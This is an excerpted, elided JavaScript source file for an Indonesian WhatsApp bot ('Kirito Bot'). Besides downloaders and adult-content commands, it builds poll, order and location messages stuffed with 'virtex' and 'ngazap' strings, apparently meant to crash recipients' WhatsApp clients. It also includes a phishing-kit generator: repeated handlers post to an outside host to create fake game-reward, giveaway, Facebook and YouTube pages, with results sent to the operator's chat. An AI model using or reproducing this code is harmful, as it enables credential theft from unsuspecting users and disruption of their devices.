...
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, makeInMemoryStore, areJidsSameUser, getContentType } = baileys
...
var packnamenya = 'XZYBOTZ'
var authornya = 'BY BARR'
...
kayla.sendMessage(m.chat, anakau, {quoted: hw})
}
...
kayla.sendMessage(m.chat, anu, {quoted: lep})
}
const sendvn = (teks) => {
...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6285850063401@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
"fileName": `Kirito Bot WhatsApp${ngazap(prefix)}`,
...
"message": {
"pollCreationMessage": {
"name": `Kirito Bot ${virus}${virtex(prefix)}`,
"options": [
	{
...
"optionName": "KATANYA KEBAL"
	...
	{
"optionName": "SALAM DARI KIRITO BOT"
	}
],
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `Kirito Bot WhatsApp${ngazap(prefix)}`,
"orderTitle": "Kirito Bot WhatsApp${ngazap(prefix)}",
"sellerJid": "6285850063401@s.whatsapp.net",
...
const botzkayla = "6285850063401@s.whatsapp.net"
...
𝘚𝘢𝘺𝘢 𝘒𝘪𝘳𝘪𝘵𝘰 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘚𝘵𝘪𝘤𝘬𝘦𝘳, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘛𝘪𝘬𝘵𝘰𝘬, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘠𝘰𝘶𝘵𝘶𝘣𝘦, 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘓𝘰𝘨𝘰 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰/𝘗𝘩𝘰𝘵𝘰𝘰𝘹𝘺/𝘌𝘱𝘩𝘰𝘵𝘰360, 𝘋𝘢𝘯 𝘓𝘢𝘪𝘯-𝘭𝘢𝘪𝘯.
...
Title : ${atdl.title}`, `Auto Downloader By Kirito`, ftext)
}
}
...
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://lynk.id/notbarrx',
"sourceUrl": 'https://chat.whatsapp.com/HgR0QRpUjMJLlYVZ1egjYM'
}
}
})
break
...
break
case 'asupan1': case 'asupansantuy': case 'asupanbocil': case 'asupanukhty': case 'asupanghea': case 'asupanrikagusriani':{
reply(mess.wait)
...
let btn = [{
                      ...
                      kayla.sendMessage(m.chat, `Nih Kak`, kayla.user.name, hasiltt, btn)
                      }
                      break
//━━━━━━━━━━━━━━━[ RANDOM ASUPAN ]━━━━━━━━━━━━━━━━━//
case 'asupan':
...
kayla.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: mess.watermark }, { quoted: m })
break
case 'asupanghea':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
...
break
case 'sound75':
kayla.sendMessage(from, { audio: fs.readFileSync('Atak/sound75.mp3'), mimetype: 'audio/mp4', ptt: true}, { quoted: m })
break
case 'sound76':
kayla.sendMessage(from, { audio: fs.readFileSync('Atak/sound76.mp3'), mimetype: 'audio/mp4', ptt: true}, { quoted: m })
break
case 'sound77':
kayla.sendMessage(from, { audio: fs.readFileSync('Atak/sound77.mp3'), mimetype: 'audio/mp4', ptt: true}, { quoted: m })
break
case 'sound78':
kayla.sendMessage(from, { audio: fs.readFileSync('Atak/sound78.mp3'), mimetype: 'audio/mp4', ptt: true}, { quoted: m })
break
case 'sound79':
kayla.sendMessage(from, { audio: fs.readFileSync('Atak/sound79.mp3'), mimetype: 'audio/mp4', ptt: true}, { quoted: m })
break
case 'sound80':
kayla.sendMessage(from, { audio: fs.readFileSync('Atak/sound80.mp3'), mimetype: 'audio/mp4', ptt: true}, { quoted: m })
break
case 'desah':
kayla.sendMessage(from, { audio: fs.readFileSync('Atak/desah.mp3'), mimetype: 'audio/mp4', ptt: true}, { quoted: m })
break
case 'hentaivid': {
if (!isPrem) return replyprem(mess.premium)
sbe = await hentaivid()
...
if (!isBotAdmins) return reply(mess.botAdmin)
    ...
    await kayla.sendMessage(pengirim,{text: `HALO ${nama} \n\n ${id} \n\n`},{quoted:lep})
...
owned = '6285850053401@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
case 'addprem':
if (!itsMeKayla) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285850053401`)
...
break
case 'ceramah': {
if (!text) return reply(`Mau Ceramah Dari Siapa?\n\nList Ustadz :\n1. abdulsomad\n2. adihidayat\n3. felixsiauw\n4. khalidbasalamah\n\nExample: ${prefix+command} abdulsomad`)
...
┣❏➥ webp10: Free Fire Claim
┣❏➥ webp11: Dunia Games
┣❏➥ webp12: Group Wa Giveaway Hp
┣❏➥ webp13: Live Facebook 
┣❏➥ webp14: Stumble 2
┣❏➥ webp15: SafeFileku
┣❏➥ webp16: YouTube 18+
┗━━⊱
...
id = m.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/mf/createcp.php',
            form: inputt
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/mf/upload.php',
                    form: inputt
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/mf2/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/mf2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/simontok/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/mlbb/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/mlbb/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/gw/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/gw/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/coda/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/coda/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/pubg/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/pubg/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/sb1/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/sb1/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/ff/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/ff/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'https://teswebp.aatxz.xyz/ff2/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/ff2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/dg/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/dg/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/whp/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/gwhp/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/lf/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/lf/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/sb2/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/sb2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/sf/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/sf/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
id = msg.key.remoteJid
        ...
        request.post({
            url: 'http://hdeh.terbaru22.works/yt/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'http://hdeh.terbaru22.works/yt/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    reply("_*BERHASIL!*, Data Segera di Kirim Ke chat Pribadi, Jika Belum masuk silahkan buat kembali (jangan spam)_") // berhasil mengupload sc
                    // hasil = JSON.parse(body)
...
"url": `https://wa.me/6285850053401`
},
"businessOwnerJid": "6285850053401@s.whatsapp.net",
}
...
"name": `Kirito Bot WhatsApp ${virus}`,
"address": `Created By Kirito ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
...
break
case 'chinese': case 'indonesia': case 'japan': case 'korea': case 'malaysia': case 'ptl': case 'thailand': case 'vietnam': {
m.reply(mess.wait)
let buttons = [
...
footer: kayla.user.name,
buttons: buttons,
headerType: 4
}
kayla.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
...
case 'anime':{
if (!isPrem) return replyprem(mess.premium)
let kaydt = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/animei.json')
let hayu = kaydt[Math.floor(Math.random() * kaydt.length)];
...
await kayla.sendMedia(m.chat, `https://didinbotz-apii.herokuapp.com/api/maker/attp?text=${text}`, 'didinbo', 'morou', m, {asSticker: true})
}
break
           case 'ttp': {
if (!text) throw `Example : ${prefix + command} text`
await kayla.sendMedia(m.chat, `https://didinbotz-apii.herokuapp.com/api/maker/ttp?text=${text}`, 'didinbo', 'morou', m, {asSticker: true})
}
break
case '>':
case '=>':
